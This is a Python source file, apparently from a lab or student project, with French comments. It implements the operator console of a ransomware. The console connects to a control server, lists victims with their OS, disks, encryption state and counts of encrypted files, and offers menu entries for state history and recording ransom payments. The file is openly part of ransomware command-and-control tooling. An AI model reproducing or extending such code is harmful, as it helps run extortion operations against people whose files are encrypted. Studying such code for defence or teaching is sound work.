from datetime import datetime

import utile.message
import utile.network as network

# Constantes
IP_SERV_CONSOLE = '192.168.56.1'
PORT_SERV_CONSOLE = 8380


def print_victims_listing(client_socket):
    liste_id = []

    print("CONSOLE DE CONTRÔLE")
    print("===================")
    print("1) Liste des victimes du ransomware")
    print("2) Historique des états d'une victime")
    print("3) Renseigner le payement de rançon d'une victime")
    print("4) Quitter")

    while True:
        message_input = input("Entrez votre message : ")
        if message_input == "1":
            message_input = 'LIST_VICTIM_REQ'

        # Envoyer le message au serveur
        network.send_message(client_socket, message_input)

        # Recevoir et traiter les réponses du serveur
        confirmation_message = network.receive_message(client_socket)
        msg_type = utile.message.get_message_type(confirmation_message)

        print("Confirmation du serveur :", confirmation_message)
        print("Type du message : " + msg_type)
        print_victims_data(client_socket, liste_id, confirmation_message, msg_type)

        if message_input == "4":
            break

def print_victims_data(client_socket, liste_id, confirmation_message, msg_type):
    texte = "LISTING DES VICTIMES DU RANSOMWARE\n"
    texte += "----------------------------------\n"
    texte += ("num".ljust(5) + "id".ljust(13) + "type".ljust(13) + "disques".ljust(14) + "statut".ljust(11)
              + "nb. de fichiers\n")

    # Réception et traitement des données des victimes
    while confirmation_message != 'LIST_VICTIM_END':
        if msg_type == 'LIST_VICTIM_RESP':
            # Mémorisation de l'ID de la victime
            liste_id.append(confirmation_message['VICTIM'])

            # Construction du message selon l'état et le nombre de fichiers
            msg_compteur = ''
            if confirmation_message['NB_FILES'] == 0:
                msg_compteur = '-'
            elif confirmation_message['STATE'] in ['PENDING', 'PROTECTED', 'CRYPT']:
                msg_compteur = str(confirmation_message['NB_FILES']) + " fichiers chiffrés"
            elif confirmation_message['STATE'] == 'DECRYPT':
                msg_compteur = str(confirmation_message['NB_FILES']) + " fichiers déchiffrés"

            # Ajout des informations de la victime à l'affichage du listing
            texte += (str(confirmation_message['VICTIM']).rjust(4, '0') + " " +
                      str(confirmation_message['HASH'])[-12:] + " " +
                      str(confirmation_message['OS']).ljust(13) +
                      str(confirmation_message['DISKS'])[:13].ljust(14) +
                      str(confirmation_message['STATE']).ljust(11) + str(msg_compteur) + "\n")

            # Réception de la réponse suivante
            confirmation_message = network.receive_message(client_socket)
            msg_type = utile.message.get_message_type(confirmation_message)

        if msg_type == 'LIST_VICTIM_END':
            break

    # Affichage du listing des victimes
    print(texte)
    print("id liste : " + str(liste_id))


def main():
    # Connexion au serveur de console
    client_socket = network.connect_to_serv(IP_SERV_CONSOLE, PORT_SERV_CONSOLE)
    print("Connexion établie avec le serveur.")

    # Affichage des listings des victimes
    print_victims_listing(client_socket)

    # Fermer la connexion avec le serveur
    client_socket.close()
    print("Connexion fermée.")

if __name__ == '__main__':
    main()